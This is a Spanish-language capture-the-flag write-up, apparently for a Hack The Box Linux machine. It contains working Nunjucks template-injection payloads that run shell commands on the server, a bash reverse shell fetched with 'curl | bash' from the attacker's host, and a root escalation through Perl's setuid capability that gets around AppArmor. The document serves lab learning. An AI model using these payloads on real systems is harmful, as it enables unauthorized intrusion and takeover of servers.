## Summary

Tags: #Linux #HTTPS #Fuzzing #SSTI #Capabilities 

- IP -> 10.10.11.122
- Ports -> TCP (22,80,443), UDP (idk)
- OS ->  Linux
- Services & Applications
    - 22 -> OpenSSH 4ubuntu0.3
    - 80 -> HTTP nginx 1.18.0
    - 443 -> HTTPS nginx 1.18.0

## Recon
Launchpad 4ubuntu0.3 -> Bionic
Launchpad nginx 1.18.0 -> Hirsuite 
Dentro de la maquina lo podremos averiguar 

❯ **nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.122  -oG allPorts**
❯ **nmap -sCV -p22,80 10.10.11.122 -oN targeted**

❯ **whatweb \http://10.10.11.122**  -> Nos dara una breve descripcion del gestor de contenidos del puerto 80
* Nos manda u re-direct, por lo tanto vamos a agregar la url **nunchucks.htb** a nuestro /etc/passwd 

❯ **openssl s_client -connect 10.10.11.122:443** Para conectarnos al openssl e inspeccionar el certificado del puerto 443

Ahora nos disponemos a ver la paginas web en el navegador 
En el Wapalyzer podemos ver en 
* Lenguaje de programacion: **Node.js**

Encontramos un **Log in** pero no nos podemos loggear ni registrarnos
Ahora hacemos Fuzzing para buscar subdominios
❯ **gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --url \https://nunchucks.htb -t 200** **-k** 
* Nos descubre un subdominio **store.nunchucks.htb**

❯ **wfuzz -c --hc=404 --hh=30587 -t 200 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H “Host: FUZZ.nunchucks.htb” \https://nunchucks.htb**

Despues agregamos ese dominio a nuestro **/etc/passwd** y lo miramos en el navegador web

Nos pide que ingresemos un email, al momento de hacerlo vemos que nos devuleve el email en la pantalla de la pagina web.
Por lo que estamos frente a un **Server Side Template Injection** en node.js, por lo que procedemos a buscar en **Google** (**node.js** **nunjunks** **ssti** **(https://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine)**) el cual nos dara ejemplos de como usar esa vulnerabilidad.

Encontramos estos comando para poder introducisrlos en la pagina web.
{{7*7}}@test.com Si nos muestra la respuesta en este caso 49, estamos ante un SSTI, colocamos el @test.com por que es un requisito de que lo que entra es un correo electronico.

Ahora en la misma pagina de nunjunks nos dice que comando podemos colocar para poder injectar un comando
❯ **{{range.constructor("return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')")()}}@test.com**
* Tail -> Es para leer las ultimas 10 lineas de un archivo
Como esa entrada no se adecua a lo que nos indica que es de un correo, nos disponemos a abrir BurpSuite y desde ahi lo haremos 

❯ **burpsuite &> /dev/null &** Iniciamos el BurpSuite y lo mandamos a segundo plano
❯ **disown** Para independizar el proceso del BurpSuite
Lo que interceptemos lo mandamos al Repeater:
❯ **Ctrl + r** Para mandar lo del proxy al repeater

Esto lo colocaremos en el campo donde esta email, ademas debemos de escapar las comillas dobles internas
“**email”:”{{range.constructor(\\"return global.process.mainModule.require('child_process').execSync('whoami')\\")()}}@test.com”**
Nos muestra el **whoami** de la maquina victima 

Como podemos ejecutar comandos, primero verificamos si podemos hacernos una peticion con **Curl** si es asi enconces podriamos hacernos una ReverShell para poder ganar acceso al sistema

❯ **python3 -m http.server 80** Nos montamos un servidor http 80
“**email”:”{{range.constructor(\\"return global.process.mainModule.require('child_process').execSync('curl 10.10.14.2')\\")()}}@test.com”** Hacemos una peticion GET desde el servidor web

Lo que trata de hacer la maquina al momento de ejecutar el **Curl** es tratar de obtener un **index.html** del servidor web. Por lo que nos disponemos a hacer un archivo que contenga una ReverShell y asi con Netcat podemos ganar acceso al sistema 

❯ **nano index.html**
	**#!/bin/bash**
	**bash -i >& /dev/tcp/10.10.14.2/443 0>&1**


## User
❯ **python3 -m http.server 80** Nos montamos un servidor http 80
❯ **nc -nlvp 443** Para ponernos en escucha por Netcat en espera de la revershell para Linux
“**email”:”{{range.constructor(\\"return global.process.mainModule.require('child_process').execSync('curl 10.10.14.2 | bash')\\")()}}@test.com”** Hacemos una peticion GET desde el servidor web para obtener el index.html malicioso y despues hacer que nos lo interprete con Bash

* Hacemos el tratamiento de la consola y buscamos la primer flag -> user.txt

❯ **lsb_release -a** Miramos algunas caracteristicas de la maquina Linux 
❯ **hostname -I** Nos muestra solo la direccion IP (I=i mayuscula)


## Root
❯ **uname -a** Miramos informacion del Kernel
❯ **find / -perm -4000 2>/dev/null** Buscaremos por privilegios suid
❯ **id** Para ver si estamos en un grupo especial

❯ **which getcap** Para ver si esta instalado el Getcap y mirar las capabilities
❯ **getcap -r / 2>/dev/null** Listamos las capabilities que existan desde la raiz de forma recursiva y buscamos el comando aqui GTFOBins [GTFOBins](https://gtfobins.github.io/)
* **/usr/bin/perl = cap_setuid+ep** Esta capabilitie nos permite gestionar el UID
	❯ **setcap cap_setuid+ep /usr/bin/perl** 
	❯ **perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'** Para conseguir la consola interactiva

Pero esto no funciona por lo que buscamos **Apparmor** que es modulo de seguridad del Kernel Linux que permite al administrador del sistema restringir las capabilities de un programa.

❯ **find \-name \*apparmor\* 2>/dev/null** | grep -vE “proc|var|share”** (vE=quitas multiples palabras)

Ahi buscamos
❯ **/etc/apparmor.d** y nos dirigimos a esa ruta con el comando cd. 

Miramos el siguiente archivo 
❯**cat usr.bin.perl** para ver el contenido del archivo y dentro hay un archivo que esta ejecutando un script en perl. 
Por lo que miramos su contenido **/opt/backup.pl**

Despues probamos el siguiente comando
❯ **perl /opt/backup.pl** Este comando solo se puede ejecutar y leer pero no podemos modificarlo, por lo que debemos de buscar un bug para poder entrar.

Buscamos en **Google (apparmor perl bugs)** y nos vamos a la siguiente pagina **bugs.launchpad.net**.
**Shebang** es el nombre que recibe el par de caracteres #! que se encuentran en el inicio de los programas ejecutables interpretados

❯ **cd /tmp/** Nos vamos al directorio tmp ya ahi tenemos ejecucion y lectura 

❯ **touch prueba.sh** Creamos el archivo y nos ayudara a tener una consola interactiva 
	#!/usr/bin/perl
	**use POSIX qw(setuid);**
	**POSIX::setuid(0);**
	**exec "****/bin/sh";

❯ **chmod** **+x prueba.sh** la ejecucion
❯ **./prueba.sh** Ejecutamos el comando anterior.

Despues de ser root nos vamos al directorio con **cd /root/** y obtenemos la flag root.txt




